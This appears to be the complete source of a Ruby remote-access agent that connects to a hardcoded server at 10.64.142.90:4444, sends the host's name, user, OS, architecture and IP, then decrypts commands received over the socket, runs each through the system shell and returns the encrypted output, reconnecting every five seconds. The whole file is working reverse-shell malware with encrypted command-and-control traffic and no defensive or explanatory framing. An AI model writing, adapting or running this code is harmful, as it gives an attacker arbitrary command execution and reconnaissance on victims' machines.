require 'socket'
require 'json'
require 'openssl'
require 'base64'

SERVER_HOST = "10.64.142.90"
SERVER_PORT = 4444

def get_local_ip
  begin
    socket = UDPSocket.new
    socket.connect("8.8.8.8", 80)
    local_ip = socket.addr.last
    socket.close
    return local_ip
  rescue
    return "N/A"
  end
end

def fernet_decrypt(token, key)
  begin
    decoded = Base64.strict_decode64(token)
    
    return nil if decoded.length < 57
    
    version = decoded[0].ord
    return nil if version != 0x80
    
    timestamp = decoded[1..8]
    iv = decoded[9..24]
    ciphertext = decoded[25..-33]
    received_hmac = decoded[-32..-1]
    
    hmac = OpenSSL::HMAC.digest('SHA256', key, decoded[0..-33])
    
    return nil unless hmac == received_hmac
    
    cipher = OpenSSL::Cipher.new('AES-128-CBC')
    cipher.decrypt
    cipher.key = key[0..15]
    cipher.iv = iv
    
    plaintext = cipher.update(ciphertext) + cipher.final
    
    return plaintext
  rescue => e
    puts "[-] Decrypt error: #{e.message}"
    return nil
  end
end

def fernet_encrypt(data, key)
  begin
    version = [0x80].pack('C')
    timestamp = [Time.now.to_i].pack('Q>')
    
    cipher = OpenSSL::Cipher.new('AES-128-CBC')
    cipher.encrypt
    cipher.key = key[0..15]
    iv = cipher.random_iv
    
    ciphertext = cipher.update(data) + cipher.final
    
    payload = version + timestamp + iv + ciphertext
    
    hmac = OpenSSL::HMAC.digest('SHA256', key, payload)
    
    token = payload + hmac
    
    return Base64.strict_encode64(token)
  rescue => e
    puts "[-] Encrypt error: #{e.message}"
    return nil
  end
end

def execute_command(command, system_info)
  if command == "SYSINFO"
    output = "OS: #{system_info[:os]}\n"
    output += "Hostname: #{system_info[:hostname]}\n"
    output += "User: #{system_info[:user]}\n"
    output += "Arch: #{system_info[:arch]}\n"
    output += "Agent IP: #{system_info[:agent_ip]}\n"
    output += "Ruby Version: #{RUBY_VERSION}\n"
    output += "Current Dir: #{Dir.pwd}"
    return output
  elsif command == "SCREENSHOT"
    return "ERROR: Screenshot not supported in Ruby agent"
  elsif ["exit", "quit", "disconnect"].include?(command.downcase)
    return "Agent disconnecting..."
  end
  
  begin
    output = `#{command} 2>&1`
    return output.empty? ? "Command executed (no output)" : output
  rescue => e
    return "ERROR: #{e.message}"
  end
end

loop do
  begin
    puts "[*] Connecting to #{SERVER_HOST}:#{SERVER_PORT}"
    
    socket = TCPSocket.new(SERVER_HOST, SERVER_PORT)
    
    puts "[+] Connected!"
    
    key = socket.read(1024)
    key = key.strip
    
    if key.nil? || key.empty?
      puts "[-] No key received"
      socket.close
      sleep 5
      next
    end
    
    puts "[+] Key received (#{key.length} bytes)"
    
    hostname = Socket.gethostname
    user = ENV['USER'] || ENV['USERNAME'] || 'unknown'
    os = RUBY_PLATFORM
    arch = RbConfig::CONFIG['host_cpu']
    agent_ip = get_local_ip
    
    system_info = {
      os: os,
      hostname: hostname,
      user: user,
      arch: arch,
      agent_ip: agent_ip
    }
    
    info = {
      os: os,
      hostname: hostname,
      user: user,
      architecture: arch,
      agentIP: agent_ip,
      pythonVersion: "Ruby-#{RUBY_VERSION}"
    }.to_json
    
    socket.write(info)
    socket.flush
    sleep 0.5
    
    puts "[+] Handshake complete"
    
    loop do
      encrypted_cmd = socket.read(8192)
      
      if encrypted_cmd.nil? || encrypted_cmd.empty?
        puts "[-] Connection closed by server"
        break
      end
      
      command = fernet_decrypt(encrypted_cmd, key)
      
      if command.nil?
        puts "[-] Failed to decrypt command"
        puts "[-] Received: #{encrypted_cmd[0..50]}"
        next
      end
      
      puts "[+] Command received: #{command[0..50]}..."
      
      output = execute_command(command, system_info)
      
      if output.length > 1000000
        output = output[0..999999] + "\n...[OUTPUT TRUNCATED - TOO LARGE]"
      end
      
      encrypted_output = fernet_encrypt(output, key)
      
      if encrypted_output.nil?
        puts "[-] Failed to encrypt output"
        next
      end
      
      socket.write(encrypted_output + "<END>")
      socket.flush
      
      puts "[+] Response sent (#{encrypted_output.length} bytes)"
      
      if ["exit", "quit", "disconnect"].include?(command.downcase)
        break
      end
    end
    
    socket.close
    puts "[*] Disconnected"
    
  rescue => e
    puts "[-] Error: #{e.message}"
    puts e.backtrace[0..2]
  end
  
  puts "[*] Reconnecting in 5 seconds..."
  sleep 5
end